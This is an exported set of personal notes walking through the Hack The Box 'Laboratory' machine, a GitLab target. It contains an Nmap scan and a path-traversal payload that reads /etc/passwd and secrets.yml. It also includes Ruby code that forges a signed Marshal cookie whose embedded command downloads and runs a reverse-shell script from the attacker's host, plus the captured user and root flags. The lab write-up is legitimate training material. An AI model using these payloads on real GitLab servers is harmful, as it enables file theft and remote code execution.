<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>LaboratoryHTB.ctb</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title level-1'>Laboratory</h1><br/></div><div class='page'><h1 class='title level-2'>Nmap</h1><br/><a href=""><img src="images/2-1.png" alt="images/2-1.png" /></a><h1><br /><br />Starting Nmap 7.80 ( </h1><a href="https://nmap.org">https://nmap.org</a><h1> ) at 2020-12-30 21:03 GMT<br />Nmap scan report for 10.10.10.216<br />Host is up (0.060s latency).<br />Not shown: 65532 filtered ports<br />PORT    STATE SERVICE  VERSION<br />22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br />80/tcp  open  http     Apache httpd 2.4.41<br />|_http-server-header: Apache/2.4.41 (Ubuntu)<br />|_http-title: Did not follow redirect to </h1><a href="https://laboratory.htb/">https://laboratory.htb/</a><h1><br />443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))<br />|_http-server-header: Apache/2.4.41 (Ubuntu)<br />|_http-title: The Laboratory<br />| ssl-cert: Subject: commonName=laboratory.htb<br />| Subject Alternative Name: DNS:git.laboratory.htb<br />| Not valid before: 2020-07-05T10:39:28<br />|_Not valid after:  2024-03-03T10:39:28<br />| tls-alpn: <br />|_  http/1.1<br />Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at </h1><a href="https://nmap.org/submit/">https://nmap.org/submit/</a><h1> .<br />Nmap done: 1 IP address (1 host up) scanned in 119.12 seconds<br /></h1></div><div class='page'><h1 class='title level-2'>DNS Alternative</h1><br/><a href=""><img src="images/3-1.png" alt="images/3-1.png" /></a><br /><a href=""><img src="images/3-2.png" alt="images/3-2.png" /></a><br /><br /></div><div class='page'><h1 class='title level-2'>Account Creation</h1><br/><a href=""><img src="images/4-1.png" alt="images/4-1.png" /></a></div><div class='page'><h1 class='title level-2'>Exploit</h1><br/><a href=""><img src="images/6-1.png" alt="images/6-1.png" /></a><br /><br /><br /><a href=""><img src="images/6-2.png" alt="images/6-2.png" /></a><br /><br /><br /><a href=""><img src="images/6-3.png" alt="images/6-3.png" /></a><br /><br /><br /><code><h1>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)  </h1></code><br /><br /><br /><a href=""><img src="images/6-4.png" alt="images/6-4.png" /></a></div><div class='page'><h1 class='title level-2'>Secrets.yml</h1><br/><a href=""><img src="images/7-1.png" alt="images/7-1.png" /></a><h1><br /><br /></h1><a href=""><img src="images/7-2.png" alt="images/7-2.png" /></a><br /><br />![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)<br /><br />To obtain secrets file:<br />/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml<br /><br />![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)<br /><br />To get Docker:<br /><a href="https://hub.docker.com/r/gitlab/gitlab-ce/tags/">https://hub.docker.com/r/gitlab/gitlab-ce/tags/</a><br /><a href=""><img src="images/7-3.png" alt="images/7-3.png" /></a><br />Get Docker v12.8.1<br /><a href=""><img src="images/7-4.png" alt="images/7-4.png" /></a><br /><br /><a href=""><img src="images/7-5.png" alt="images/7-5.png" /></a><br /><br />- The name after “ -it ” will change<br /><br />Open the secrets file you took from the server - copy the secret key<br /><br /><a href=""><img src="images/7-6.png" alt="images/7-6.png" /></a><br /><br />Copy this line from the SERVER SECRET - PASTE into YOUR SECRETS FILE<br /><br /><a href=""><img src="images/7-7.png" alt="images/7-7.png" /></a></div><div class='page'><h1 class='title level-2'>Shell</h1><br/><h1>Create bash one liner into bash.sh<br />Create pythjon server local<br /><br /><br />1. </h1><code><h1>python -m SimpleHTTPServer</h1></code><br /><a href=""><img src="images/9-1.png" alt="images/9-1.png" /></a><br /><br /><a href=""><img src="images/9-2.png" alt="images/9-2.png" /></a><br />REPLACE IP AND PORT WITH YOURS FOR REVERSE SHELL<br /><br /><br />IN DOCKER SESSION:<br /><a href=""><img src="images/9-3.png" alt="images/9-3.png" /></a><br /><br /><br />request = ActionDispatch::Request.new(Rails.application.env_config)<br />request.env[&quot;action_dispatch.cookies_serializer&quot;] = :marshal<br />cookies = request.cookie_jar<br />erb = ERB.new(&quot;&lt;%= `curl 10.10.14.123:4545/bash.sh -o /tmp/bash.sh &amp;&amp; chmod 777 /tmp/bash.sh &amp;&amp; bash /tmp/bash.sh` %&gt;&quot;)<br />depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &quot;@result&quot;, ActiveSupport::Deprecation.new)<br />cookies.signed[:cookie] = depr<br />puts cookies[:cookie]<br /><br /><a href=""><img src="images/9-4.png" alt="images/9-4.png" /></a><br /><br />BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAZojY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgY3VybCAxMC4xMC4xNC4xMjM6NDU0NS9iYXNoLnNoIC1vIC90bXAvYmFzaC5zaCAmJiBjaG1vZCA3NzcgL3RtcC9iYXNoLnNoICYmIGJhc2ggL3RtcC9iYXNoLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--8de4b122e2a07a71a046d57ef140aebd4e44283f<br /><br /><a href=""><img src="images/9-5.png" alt="images/9-5.png" /></a><br /><br /><a href=""><img src="images/9-6.png" alt="images/9-6.png" /></a><br /><a href=""><img src="images/9-7.png" alt="images/9-7.png" /></a><br /><br /><a href=""><img src="images/9-8.png" alt="images/9-8.png" /></a><br /><br /><a href=""><img src="images/9-9.png" alt="images/9-9.png" /></a><br /><br /></div><div class='page'><h1 class='title level-2'>Dexter</h1><br/><br /><a href=""><img src="images/10-1.png" alt="images/10-1.png" /></a><h1><br /><br /></h1><a href=""><img src="images/10-2.png" alt="images/10-2.png" /></a><br /><br /><a href=""><img src="images/10-3.png" alt="images/10-3.png" /></a><br /><br /><a href=""><img src="images/10-4.png" alt="images/10-4.png" /></a><br /><br /><a href=""><img src="images/10-5.png" alt="images/10-5.png" /></a><br /><br />Sign into git<br /><br /><a href=""><img src="images/10-6.png" alt="images/10-6.png" /></a><br /><br /><a href=""><img src="images/10-7.png" alt="images/10-7.png" /></a><br /><br /><a href=""><img src="images/10-8.png" alt="images/10-8.png" /></a><br /><br /><a href=""><img src="images/10-9.png" alt="images/10-9.png" /></a><br /><br /><a href=""><img src="images/10-10.png" alt="images/10-10.png" /></a><br /><br />USER: 4066d22a98b0266105e4aecb3070a994<br /></div><div class='page'><h1 class='title level-2'>Root</h1><br/><a href=""><img src="images/11-1.png" alt="images/11-1.png" /></a><h1><br /><br /></h1><a href=""><img src="images/11-2.png" alt="images/11-2.png" /></a><br /><br /><a href=""><img src="images/11-3.png" alt="images/11-3.png" /></a><br /><br /><a href=""><img src="images/11-4.png" alt="images/11-4.png" /></a><br /><br /><a href=""><img src="images/11-5.png" alt="images/11-5.png" /></a><br /><br /><a href=""><img src="images/11-6.png" alt="images/11-6.png" /></a><br /><br /><a href=""><img src="images/11-7.png" alt="images/11-7.png" /></a><br /><br /><a href=""><img src="images/11-8.png" alt="images/11-8.png" /></a><br /><br /><a href=""><img src="images/11-9.png" alt="images/11-9.png" /></a><br /><br /><a href=""><img src="images/11-10.png" alt="images/11-10.png" /></a><br />ROOT: 00f6b8bfbd9dbd21eadc617452091209<br /></div>
</body>
</html>
